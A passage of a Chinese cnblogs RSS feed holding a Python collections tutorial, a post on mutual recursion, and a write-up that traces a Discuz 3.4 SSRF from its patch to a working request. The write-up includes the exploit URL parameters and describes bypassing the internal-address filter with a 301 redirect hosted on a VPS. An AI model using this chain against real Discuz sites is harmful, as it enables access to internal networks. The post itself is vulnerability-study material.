Counter({'hello': 3, 'world': 2, 'nihao': 1})
&amp;gt;&amp;gt;&amp;gt; d
Counter({'hello': 1, 'world': 1})
&amp;gt;&amp;gt;&amp;gt; c + d
Counter({'hello': 4, 'world': 3, 'nihao': 1})
# 减少对象，或者使用c.subtract(d)
&amp;gt;&amp;gt;&amp;gt; c - d
Counter({'hello': 2, 'world': 1, 'nihao': 1})
# 清除
&amp;gt;&amp;gt;&amp;gt; c.clear()
&amp;gt;&amp;gt;&amp;gt; c
Counter()&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;defaultdict&quot;&gt;defaultdict&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;collections.defaultdict(default_factory)&lt;/code&gt;为字典的没有的key提供一个默认的值。参数应该是一个函数，当没有参数调用时返回默认值。如果没有传递任何内容，则默认为None。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; d = collections.defaultdict()
&amp;gt;&amp;gt;&amp;gt; d
defaultdict(None, {})
&amp;gt;&amp;gt;&amp;gt; e = collections.defaultdict(str)
&amp;gt;&amp;gt;&amp;gt; e
defaultdict(&amp;lt;class 'str'&amp;gt;, {})&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;defaultdict的一个典型用法是使用其中一种内置类型(如str、int、list或dict)作为默认工厂，因为这些内置类型在没有参数调用时返回空类型。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; d = collections.defaultdict(str)
&amp;gt;&amp;gt;&amp;gt; d
defaultdict(&amp;lt;class 'str'&amp;gt;, {})
&amp;gt;&amp;gt;&amp;gt; d['hello']
''
&amp;gt;&amp;gt;&amp;gt; d
defaultdict(&amp;lt;class 'str'&amp;gt;, {'hello': ''})
# 普通字典调用不存在的键时，将会抛异常
&amp;gt;&amp;gt;&amp;gt; e = {}
&amp;gt;&amp;gt;&amp;gt; e['hello']
Traceback (most recent call last):
  File &quot;&amp;lt;stdin&amp;gt;&quot;, line 1, in &amp;lt;module&amp;gt;
KeyError: 'hello'&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;使用&lt;code&gt;int&lt;/code&gt;作为default_factory的例子：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; from collections import defaultdict
&amp;gt;&amp;gt;&amp;gt; fruit = defaultdict(int)
&amp;gt;&amp;gt;&amp;gt; fruit['apple'] += 2 
&amp;gt;&amp;gt;&amp;gt; fruit
defaultdict(&amp;lt;class 'int'&amp;gt;, {'apple': 2})
&amp;gt;&amp;gt;&amp;gt; fruit
defaultdict(&amp;lt;class 'int'&amp;gt;, {'apple': 2})
&amp;gt;&amp;gt;&amp;gt; fruit['banana']  # 没有对象时，返回0
0
&amp;gt;&amp;gt;&amp;gt; fruit
defaultdict(&amp;lt;class 'int'&amp;gt;, {'apple': 2, 'banana': 0})&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;使用&lt;code&gt;list&lt;/code&gt;作为default_factory的例子：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; s = [('NC', 'Raleigh'), ('VA', 'Richmond'), ('WA', 'Seattle'), ('NC', 'Asheville')]
&amp;gt;&amp;gt;&amp;gt; d = collections.defaultdict(list)
&amp;gt;&amp;gt;&amp;gt; for k,v in s:
...      d[k].append(v)
... 
&amp;gt;&amp;gt;&amp;gt; d
defaultdict(&amp;lt;class 'list'&amp;gt;, {'NC': ['Raleigh', 'Asheville'], 'VA': ['Richmond'], 'WA': ['Seattle']})&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;ordereddict&quot;&gt;OrderedDict&lt;/h2&gt;
&lt;p&gt;Python字典中的键的顺序是任意的:它们不受添加的顺序的控制。&lt;br/&gt;&lt;code&gt;collections.OrderedDict&lt;/code&gt;类提供了保留他们添加顺序的字典对象。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; from collections import OrderedDict
&amp;gt;&amp;gt;&amp;gt; o = OrderedDict()
&amp;gt;&amp;gt;&amp;gt; o['key1'] = 'value1'
&amp;gt;&amp;gt;&amp;gt; o['key2'] = 'value2'
&amp;gt;&amp;gt;&amp;gt; o['key3'] = 'value3'
&amp;gt;&amp;gt;&amp;gt; o
OrderedDict([('key1', 'value1'), ('key2', 'value2'), ('key3', 'value3')])&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如果在已经存在的key上添加新的值，将会保留原来的key的位置，然后覆盖value值。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; o['key1'] = 'value5'
&amp;gt;&amp;gt;&amp;gt; o
OrderedDict([('key1', 'value5'), ('key2', 'value2'), ('key3', 'value3')])&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;namedtuple&quot;&gt;namedtuple&lt;/h2&gt;
&lt;p&gt;三种定义命名元组的方法：第一个参数是命名元组的构造器（如下的：Person，Human）&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; from collections import namedtuple
&amp;gt;&amp;gt;&amp;gt; Person = namedtuple('Person', ['age', 'height', 'name'])
&amp;gt;&amp;gt;&amp;gt; Human = namedtuple('Human', 'age, height, name')
&amp;gt;&amp;gt;&amp;gt; Human2 = namedtuple('Human2', 'age height name')&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;实例化命令元组&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; tom = Person(30,178,'Tom')
&amp;gt;&amp;gt;&amp;gt; jack = Human(20,179,'Jack')
&amp;gt;&amp;gt;&amp;gt; tom
Person(age=30, height=178, name='Tom')
&amp;gt;&amp;gt;&amp;gt; jack
Human(age=20, height=179, name='Jack')
&amp;gt;&amp;gt;&amp;gt; tom.age #直接通过  实例名+.+属性 来调用
30
&amp;gt;&amp;gt;&amp;gt; jack.name
'Jack'&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;deque&quot;&gt;deque&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;collections.deque&lt;/code&gt;返回一个新的双向队列对象，从左到右初始化(用方法 append()) ，从 iterable （迭代对象) 数据创建。如果 iterable 没有指定，新队列为空。&lt;br/&gt;&lt;code&gt;collections.deque&lt;/code&gt;队列支持线程安全，对于从两端添加(append)或者弹出(pop)，复杂度O(1)。&lt;br/&gt;虽然&lt;code&gt;list&lt;/code&gt;对象也支持类似操作，但是这里优化了定长操作（pop(0)、insert(0,v)）的开销。&lt;br/&gt;如果 maxlen 没有指定或者是 None ，deques 可以增长到任意长度。否则，deque就限定到指定最大长度。一旦限定长度的deque满了，当新项加入时，同样数量的项就从另一端弹出。&lt;br/&gt;支持的方法：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;append(x)：添加x到右端&lt;/li&gt;
&lt;li&gt;appendleft(x)：添加x到左端&lt;/li&gt;
&lt;li&gt;clear()：清楚所有元素，长度变为0&lt;/li&gt;
&lt;li&gt;copy()：创建一份浅拷贝&lt;/li&gt;
&lt;li&gt;count(x)：计算队列中个数等于x的元素&lt;/li&gt;
&lt;li&gt;extend(iterable)：在队列右侧添加iterable中的元素&lt;/li&gt;
&lt;li&gt;extendleft(iterable)：在队列左侧添加iterable中的元素，注：在左侧添加时，iterable参数的顺序将会反过来添加&lt;/li&gt;
&lt;li&gt;index(x[,start[,stop]])：返回第 x 个元素（从 start 开始计算，在 stop 之前）。返回第一个匹配，如果没找到的话，升起 ValueError 。&lt;/li&gt;
&lt;li&gt;insert(i,x)：在位置 i 插入 x 。注：如果插入会导致一个限长deque超出长度 maxlen 的话，就升起一个 IndexError 。&lt;/li&gt;
&lt;li&gt;pop()：移除最右侧的元素&lt;/li&gt;
&lt;li&gt;popleft()：移除最左侧的元素&lt;/li&gt;
&lt;li&gt;remove(value)：移去找到的第一个 value。没有抛出ValueError&lt;/li&gt;
&lt;li&gt;reverse()：将deque逆序排列。返回 None 。&lt;/li&gt;
&lt;li&gt;maxlen：队列的最大长度，没有限定则为None。&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; from collections import deque
&amp;gt;&amp;gt;&amp;gt; d = deque(maxlen=10)
&amp;gt;&amp;gt;&amp;gt; d
deque([], maxlen=10)
&amp;gt;&amp;gt;&amp;gt; d.extend('python')
&amp;gt;&amp;gt;&amp;gt; [i.upper() for i in d]
['P', 'Y', 'T', 'H', 'O', 'N']
&amp;gt;&amp;gt;&amp;gt; d.append('e')
&amp;gt;&amp;gt;&amp;gt; d.appendleft('f')
&amp;gt;&amp;gt;&amp;gt; d
deque(['f', 'p', 'y', 't', 'h', 'o', 'n', 'e'], maxlen=10)&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;chainmap&quot;&gt;ChainMap&lt;/h2&gt;
&lt;p&gt;一个 ChainMap 将多个字典或者其他映射组合在一起，创建一个单独的可更新的视图。 如果没有 maps 被指定，就提供一个默认的空字典 。&lt;code&gt;ChainMap&lt;/code&gt;是管理嵌套上下文和覆盖的有用工具。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; from collections import ChainMap
&amp;gt;&amp;gt;&amp;gt; d1 = {'apple':1,'banana':2}
&amp;gt;&amp;gt;&amp;gt; d2 = {'orange':2,'apple':3,'pike':1}
&amp;gt;&amp;gt;&amp;gt; combined_d = ChainMap(d1,d2)
&amp;gt;&amp;gt;&amp;gt; reverse_combind_d = ChainMap(d2,d1)
&amp;gt;&amp;gt;&amp;gt; combined_d 
ChainMap({'apple': 1, 'banana': 2}, {'orange': 2, 'apple': 3, 'pike': 1})
&amp;gt;&amp;gt;&amp;gt; reverse_combind_d
ChainMap({'orange': 2, 'apple': 3, 'pike': 1}, {'apple': 1, 'banana': 2})
&amp;gt;&amp;gt;&amp;gt; for k,v in combined_d.items():
...      print(k,v)
... 
pike 1
apple 1
banana 2
orange 2
&amp;gt;&amp;gt;&amp;gt; for k,v in reverse_combind_d.items():
...      print(k,v)
... 
pike 1
apple 3
banana 2
orange 2
&lt;/code&gt;
&lt;/pre&gt;</description>
<pubDate>Sun, 28 Apr 2019 15:17:00 +0000</pubDate>
<dc:creator>Python运维开发</dc:creator>
<og:description>Python中collections模块 [TOC] 这个模块实现了特定目标的容器，以提供Python标准内建容器 dict、list、set、tuple 的替代选择。 Counter：字典的子类，提</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/dianel/p/10787693.html</dc:identifier>
</item>
<item>
<title>Discuz3.4-SSRF-从触发点到构造payload - ka1n4t</title>
<link>http://www.cnblogs.com/litlife/p/10787682.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/litlife/p/10787682.html</guid>
<description>&lt;h2 id=&quot;ssrf逆向分析&quot;&gt;SSRF逆向分析&lt;/h2&gt;
&lt;h3 id=&quot;x00-前言&quot;&gt;0x00 前言&lt;/h3&gt;
&lt;p&gt;之前有复现过一些漏洞，但是每次按照别人的思路复现完了之后感觉还是有很多疑问，知道了怎么做但是不知道为什么这么做，所以这次我尝试自己从补丁一步步找到攻击链，构造poc。&lt;/p&gt;
&lt;h3 id=&quot;x01-收集情报&quot;&gt;0x01 收集情报&lt;/h3&gt;
&lt;p&gt;补丁地址：&lt;br/&gt;&lt;a href=&quot;https://gitee.com/ComsenzDiscuz/DiscuzX/commit/41eb5bb0a3a716f84b0ce4e4feb41e6f25a980a3&quot; class=&quot;uri&quot;&gt;https://gitee.com/ComsenzDiscuz/DiscuzX/commit/41eb5bb0a3a716f84b0ce4e4feb41e6f25a980a3&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;查看补丁，发现如下：&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231036229-1883155460.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;删去了followlocation，也就是说对于301/302请求，curl不会去跟踪跳转。&lt;br/&gt;既然这里存在一个跳转ssrf，下面就是逆向调用链，找到程序的入口。&lt;/p&gt;
&lt;h3 id=&quot;x02-尝试逆向找到触发点&quot;&gt;0x02 尝试逆向找到触发点&lt;/h3&gt;
&lt;p&gt;首先这个存在漏洞的函数是_dfsockopen，通过Ctrl+Alt+F大法找到了位于function_core.php的dfsockopen方法。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231044685-8726578.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;继续向上找，找到了一处import_block方法。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231050576-1823625711.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;通过对dfsockopen的第一个参数进行分析，发现其刚好是import_block的第一个参数经过一些处理之后的结果。&lt;br/&gt;由于参数可控，继续向上。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231100575-46652462.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;鸡冻人心的发现！第一个参数直接以$_GET传了进去！&lt;/p&gt;
&lt;h3 id=&quot;x03-尝试构造payload&quot;&gt;0x03 尝试构造payload&lt;/h3&gt;
&lt;p&gt;下面看一下如何访问到这个语句：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231106501-1581435964.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;首先，直接通过文件肯定是访问不了的（L10-12）。下面根据L19和L21确定url中基本要必须存在的参数。经过一系列的尝试和Ctrl+Alt+F，终于找到了入口：&lt;br/&gt;&lt;code&gt;/upload/admin.php?action=blockxml&amp;amp;operation=add&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231113458-424155583.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;跟进一下submitcheck()&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231118816-656138023.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;继续跟进getgpc()&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231123665-1682617257.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;大概就是返回$_GET[$k]，由于这里的$k就是从前面的submitcheck('addsubmit')传进来的，所以这里只要保证$_GET['addsubmit']即可，构成的url如下：&lt;br/&gt;&lt;code&gt;/upload/admin.php?action=blockxml&amp;amp;operation=add&amp;amp;addsubmit=test&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;继续跟，&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231130918-1426329754.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以看到getgpc返回了$_GET['addsubmit']的值，由于我们的url参数中有此参数，因此进入到了else语句块。继续跟进submitcheck&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231136640-1575887569.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这里又有一个相同的getgpc()，由于参数跟刚刚也相同，就不继续跟了，直接进入到else语句块。可以看到，首先22行有个if语句，必须把条件满足成True，否则是False的话就直接进入Else语句块，这条链就直接中断掉了。仔细看一下这个if条件：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$allowget || ($_SERVER['REQUEST_METHOD'] == 'POST' &amp;amp;&amp;amp; 
!empty($_GET['formhash']) &amp;amp;&amp;amp; $_GET['formhash'] == formhash() &amp;amp;&amp;amp; 
empty($_SERVER['HTTP_X_FLASH_VERSION']) &amp;amp;&amp;amp; 
(empty($_SERVER['HTTP_REFERER']) ||      strncmp($_SERVER['HTTP_REFERER'], 'http://wsq.discuz.com/', 22) 
=== 0 || preg_replace(&quot;/https?:\/\/([^\:\/]+).*/i&quot;, &quot;\\1&quot;, 
$_SERVER['HTTP_REFERER']) == preg_replace(&quot;/([^\:]+).*/&quot;, &quot;\\1&quot;, 
$_SERVER['HTTP_HOST'])))&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;最外层是个or，如果$allowget是True就直接省事儿了，可是这是此方法的第二个参数，默认为0，pass。剩下的逻辑如下：&lt;br/&gt;1）必须是POST请求 &amp;amp;&amp;amp;&lt;br/&gt;2）GET请求中必须有formhash参数 &amp;amp;&amp;amp;&lt;br/&gt;3）formhash的值必须等于formhash() &amp;amp;&amp;amp;&lt;br/&gt;4）请求头中没有HTTP_X_FLASH_VERSION &amp;amp;&amp;amp;&lt;br/&gt;5.1）refer为空 ||&lt;br/&gt;5.2）referer的值以http://wsq.discuz.com/开头 ||&lt;br/&gt;5.3）referer与host的主机名部分必须相同&lt;/p&gt;
&lt;p&gt;第1、4、5条件好满足，直接抓包改即可。主要看第二个请求和第三个请求，即如何获取这个formhash。看一下函数定义：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231145045-2065481122.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;其大致是计算一个数的MD5，这个数由几个$_G变量组成。既然不是一个固定的值，那么首先肯定是服务端先发给客户端，然后客户端才能带着这个$_GET['formhash']来进行请求，下面全局搜一下formhash，发现很多页面中都有这个字段：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231152042-1413742906.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;然后随手在页面上查找一下，没想到真找到了：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231158635-399271097.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;（经过一些测试，这里有个比较坑的点是这个formhash在同一个session请求中是不会变的，不过前台和后台的formhash不是同一个，你不能拿前台获取的formhash作为参数去访问后台的接口）。&lt;/p&gt;
&lt;p&gt;formhash的问题到这里就解决了，会看一下上面的条件，构成的url暂时如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;POST ..../upload/admin.php?action=blockxml&amp;amp;operation=add&amp;amp;addsubmit=test&amp;amp;formhash=2b23ba6f&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;并且去掉referer头。&lt;br/&gt;请求之后可以发现，成功进入了if语句，然后顺其自然的到了return True。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231206325-471744371.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;然后就终于回到了最开始的地方，成功调用import_block()&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231212797-315057022.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;由于这里需要$_GET['xmlurl']，我们暂且传入http://127.0.0.1:2222。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231218981-1777202150.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以看到，最后url赋值给了$signurl，其值变成：&lt;br/&gt;&lt;code&gt;http://127.0.0.1:2222?charset=utf-8&amp;amp;clientid=&amp;amp;op=getconfig&amp;amp;sign=&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;没有什么太大的变化，继续跟进后就到了最开始说的那个可能存在ssrf的_dfsockopen方法了。通过下图可以看到，先是在33行调用parse_url对用户传来的url进行解析，然后调用_isLocalip()来检查host是否是内网地址，如果是内网地址则直接return掉。所以就算这里存在ssrf，我们的url中也是不能直接传内网地址进来的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231229014-1897835831.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231237407-62866231.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;接着看，这里在88行发送了请求，我在这次请求中传入的url是：&lt;code&gt;upload/admin.php?action=blockxml&amp;amp;operation=add&amp;amp;addsubmit=test&amp;amp;formhash=2b23ba6f&amp;amp;xmlurl=http://127.0.0.1:2222&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231244005-2140595686.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这里看一下我本地监听的2222端口：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231250470-108285756.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;访问成功了。&lt;/p&gt;
&lt;p&gt;下面的整理下思路，由于程序对内网地址进行了限制，导致了除127.0.0.1之外的内网地址都会直接return掉，因此这里我们需要通过一个301跳转，来实现绕过程序对内网url的限制。&lt;br/&gt;可是如果想要curl自动重定向到第一个url返回的地址中去，就必须先要将此curl的CURLOPT_FOLLOWLOCATION属性设置为true才行。然而这一点在本文一开始就已经确认了：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231257281-1731664201.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;下面就可以通过在vps上上传一个301跳转的php脚本，内容如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231303457-500795946.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;下面把我们之前的payload中的xmlurl改成我的公网vps的ip，然后重放，同时在本地监听9999端口。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231308815-278281377.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;请求结果如下，可以发现，本地的9999端口果然收到了discuz-curl发来的请求！&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231316744-1032684932.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;我的vps的http日志：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190428231323346-817798913.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;至此，这条ssrf的攻击链就已经形成了。&lt;/p&gt;
&lt;h3 id=&quot;x04-总结&quot;&gt;0x04 总结&lt;/h3&gt;
&lt;p&gt;这次跟下来还是学到了一些东西的，比如构造payload时会遇到的一些坑，然后自己对ssrf也有了跟深入的一些理解。&lt;/p&gt;
</description>
<pubDate>Sun, 28 Apr 2019 15:14:00 +0000</pubDate>
<dc:creator>ka1n4t</dc:creator>
<og:description>[TOC] SSRF逆向分析 0x00 前言 之前有复现过一些漏洞，但是每次按照别人的思路复现完了之后感觉还是有很多疑问，知道了怎么做但是不知道为什么这么做，所以这次我尝试自己从补丁一步步找到攻击链，</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/litlife/p/10787682.html</dc:identifier>
</item>
<item>
<title>相互递归 - 窗户</title>
<link>http://www.cnblogs.com/Colin-Cai/p/10787636.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/Colin-Cai/p/10787636.html</guid>
<description>&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;34&quot;&gt;
&lt;pre class=&quot;brush:sql;gutter:true;&quot;&gt;
　　版权申明：本文为博主窗户(Colin Cai)原创，欢迎转帖。如要转贴，必须注明原文网址

　　http://www.cnblogs.com/Colin-Cai/p/10787636.html 

　　作者：窗户

　　QQ/微信：6679072

　　E-mail：6679072@qq.com
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　相互递归就是多个函数互相定义，最常见的就是两个函数，比如f和g，f的定义中用到g，而g的定义中用到f。&lt;/p&gt;
&lt;p&gt;　　相互递归一样有无限递归的可能，最简单的:&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　f:x-&amp;gt;g(x)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　g:x-&amp;gt;f(x)&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;　　给个最简单的没有无限递归的例子，判断一个正整数是不是偶数或者是不是奇数，用C++来描述如下:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;bool&lt;/span&gt;&lt;span&gt; is_odd(unsigned x);
&lt;/span&gt;&lt;span&gt;bool&lt;/span&gt;&lt;span&gt; is_even(unsigned x)
{
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(x == &lt;span&gt;0u&lt;/span&gt;&lt;span&gt;)
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; is_odd(x-&lt;span&gt;1u&lt;/span&gt;&lt;span&gt;);
}
&lt;/span&gt;&lt;span&gt;bool&lt;/span&gt;&lt;span&gt; is_odd(unsigned x)
{
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(x == &lt;span&gt;0u&lt;/span&gt;&lt;span&gt;)
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; is_even(x-&lt;span&gt;1u&lt;/span&gt;&lt;span&gt;);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;　　以上效率虽然不高（甚至不优化的情况下，可能会崩栈），但是is_even和is_odd两个函数毕竟是相互定义的，也是相互递归的一个经典例子。&lt;/p&gt;

&lt;p&gt;　　Scheme当然一样支持相互递归，r5rs中也是以上述奇偶来做例子。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
(define (even?&lt;span&gt; x)
 (&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (zero?&lt;span&gt; x)
  #t
  (odd&lt;/span&gt;? (- x &lt;span&gt;1&lt;/span&gt;&lt;span&gt;))
 )
)
(define (odd&lt;/span&gt;?&lt;span&gt; x)
 (&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (zero?&lt;span&gt; x)
  #f
  (even&lt;/span&gt;? (- x &lt;span&gt;1&lt;/span&gt;&lt;span&gt;))
 )
)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;　　再给个稍微复杂的例子，Scheme里的append是个常用的函数，它可以传入一组列表，得到这组列表首尾拼接在一起的列表。比如：(append '(1 2 3) '(4 5 6) '(7 8 9))得到(1 2 3 4 5 6 7 8 9)。&lt;/p&gt;
&lt;p&gt;　　每个人学习Scheme的过程，基本必然伴随着append函数的自我实现。&lt;/p&gt;
&lt;p&gt;　　以下是其中一种实现(当然，append有好几种不同的实现思想)：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;(define (append . lst)
 (&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (&lt;span&gt;null&lt;/span&gt;?&lt;span&gt; lst)
  &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;
&lt;span&gt;  ((apply _append (cdr lst)) (car lst))
 )
)

(define (_append . lst)
 (cond
  ((&lt;/span&gt;&lt;span&gt;null&lt;/span&gt;?&lt;span&gt; lst) (lambda (x) x))
  ((&lt;/span&gt;&lt;span&gt;null&lt;/span&gt;?&lt;span&gt; (cdr lst))
   (lambda (x)
    (&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (&lt;span&gt;null&lt;/span&gt;?&lt;span&gt; x)
     (car lst)
     (cons (car x) ((_append (car lst)) (cdr x)))
    )
   )
  )
  (&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; (_append (apply append lst)))
 )
)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;　　当然，_append一般应该实现在append的内部，我这么写也是为了表示的清楚一点。这种写法是一种相对高级一点的写法，采用的算子方式，不断用闭包来传递信息，并使用了相互递归，append和_append两个函数互相定义。&lt;/p&gt;

&lt;p&gt;　　当然，一开始就说了，相互递归完全可以不只是两个函数之间的关系，可以是多个函数之间的关系。&lt;/p&gt;
&lt;p&gt;　　我这里给个例子，把正整数按照除以3得到的余数分为三类，把整除3的数称为type0，把除以3余1的数称为type1，把除以3余2的数称为type2。于是定义三个谓词函数type0? type1? type2?&lt;/p&gt;
&lt;p&gt;　　以下为实现：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
(define (type0?&lt;span&gt; x)
 (&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (= x &lt;span&gt;0&lt;/span&gt;&lt;span&gt;)
  #t
  (type2&lt;/span&gt;? (- x &lt;span&gt;1&lt;/span&gt;&lt;span&gt;))
 )
)
(define (type1&lt;/span&gt;?&lt;span&gt; x)
 (&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (= x &lt;span&gt;0&lt;/span&gt;&lt;span&gt;)
  #f
  (type0&lt;/span&gt;? (- x &lt;span&gt;1&lt;/span&gt;&lt;span&gt;))
